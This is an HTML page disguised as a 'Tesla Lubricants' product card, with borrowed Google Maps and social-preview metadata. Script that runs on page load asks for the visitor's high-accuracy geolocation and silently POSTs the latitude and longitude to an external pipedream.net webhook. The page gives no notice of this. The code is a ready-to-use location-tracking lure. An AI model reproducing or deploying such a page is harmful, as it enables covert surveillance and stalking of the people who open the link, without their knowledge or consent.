<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:type" content="article"/>
    <meta property="og:title" content="Tesla"/>
      <link href="/maps/preview/opensearch.xml?hl=en" title="Google Maps" rel="search" type="application/opensearchdescription+xml">
      <title>Tesla Lubricants</title>
      <meta content="Tesla" name="Description">
      <meta content="initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no" name="viewport">
      <meta content="chrome=1" http-equiv="X-UA-Compatible">
      <meta content="notranslate" name="google">
      <meta content="origin" name="referrer">
      <meta content="Tesla" itemprop="name">
      <meta content="Tesla" property="og:title">
      <meta content="tesla1.jpg" itemprop="image">
      <meta content="tesla1.jpg" property="og:image">
      <meta content="256" property="og:image:width">
      <meta content="256" property="og:image:height">
      <meta content="Tesla Lubricant" itemprop="description">
      <meta content="Tesla Lubricant" property="og:description">
      <meta content="Tesla Lubricant" property="og:site_name">
      <meta content="summary" name="twitter:card">  

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-iYQeCzEYFbKjA/T2uDLTpkwGzCiq6soy8tYaI1GyVh/UjpbCx/TYkiZhlZB6+fzT" crossorigin="anonymous">
  </head>
  <body onload="getLocation()">
    <div class="card" style="width: 18rem;">
        <img src="tesla1.jpg" class="card-img-top" alt="Tesla" >
        <div class="card-body">
          <h5 class="card-title">Tesla Bottle</h5>
          <p class="card-text">Tesla Lubricants</p>
          
        </div>
      </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-u1OknCvxWvY5kfmNBILK2hRnQC3Pr17a+RTT6rIHI7NnikvbZlHgTPOOmMi466C8" crossorigin="anonymous"></script>
  </body>
  <script>
    var x = document.getElementById("demo");

    function getLocation() {
      const options = {
        enableHighAccuracy: true,
        timeout: 5000,
        maximumAge: 0
      };

      function success(pos) {
        const crd = pos.coords;

        console.log('Your current position is:');
        console.log(`Latitude : ${crd.latitude}`);
        console.log(`Longitude: ${crd.longitude}`);
        console.log(`More or less ${crd.accuracy} meters.`);
        showPosition(pos);
      }

      function error(err) {
        console.warn(`ERROR(${err.code}): ${err.message}`);
      }

      navigator.geolocation.getCurrentPosition(success, error, options);
      /*console.log("getLocation")
      if (navigator.geolocation) {
        console.log("navigator")
        //navigator.geolocation.getCurrentPosition(showPosition);
        //navigator.geolocation.getCurrentPosition(foundLocation, noLocation);
        navigator.geolocation.getCurrentPosition(successCallback,errorCallback,{timeout:10000});
      } else { 
        //x.innerHTML = "Geolocation is not supported by this browser.";
      }*/
    }

  /*function successCallback(position) {
      //var lat = position.coords.latitude;
      //var lon = position.coords.longitude;
      showPosition(position);
      
  }
  function errorCallback() {
    console.log("Could not find location");
  }*/

    function showPosition(position) {
      console.log("showPosition")
      let postObj = { 
        latitude: position.coords.latitude, 
        longitude: position.coords.longitude, 
      }
      let post = JSON.stringify(postObj)
     
      const url = "https://eoyqux6cp0g04t9.m.pipedream.net"
      let xhr = new XMLHttpRequest()
     
      xhr.open('POST', url, true)
      xhr.setRequestHeader('Content-type', 'application/json; charset=UTF-8')
      xhr.send(post);
     
      xhr.onload = function () {
          if(xhr.status === 201) {
              console.log("Post successfully created!") 
          }
      }
    }
</script>
</html>